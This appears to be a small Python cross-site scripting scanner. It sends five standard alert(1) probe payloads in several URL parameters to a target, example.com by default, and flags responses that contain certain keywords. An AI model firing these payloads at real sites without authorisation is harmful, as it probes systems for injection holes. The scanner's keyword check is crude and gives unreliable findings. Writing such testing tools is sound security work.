import requests
from concurrent.futures import ThreadPoolExecutor


xss_payloads = [
    '<script>alert(1)</script>', 
    '" onmouseover="alert(1)"', 
    '<img src=x onerror=alert(1)>', 
    '<svg/onload=alert(1)>', 
    '<iframe src="javascript:alert(1)"></iframe>', 
   
]

def check_payload(url, param, payload):
    try:
        response = requests.get(url, params={param: payload})
        response_text = response.text
        
     
        if any(keyword in response_text for keyword in ['alert(1)', 'javascript:', 'onerror', '<svg']):
            return f"Potential XSS vulnerability found with payload: {payload} in param: {param}"
        else:
            return f"Payload {payload} appears safe in param: {param}."
    except requests.exceptions.RequestException as e:
        return f"Error scanning {url} with payload {payload} in param {param}: {e}"

def scan_xss(url, params):
    print(f"Scanning {url} for XSS vulnerabilities...")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_payload, url, param, payload) 
                   for param in params 
                   for payload in xss_payloads]
        
        for future in futures:
            print(future.result())


if __name__ == "__main__":
    target_url = "http://example.com"
    params = ['input', 'search', 'id']
    scan_xss(target_url, params)

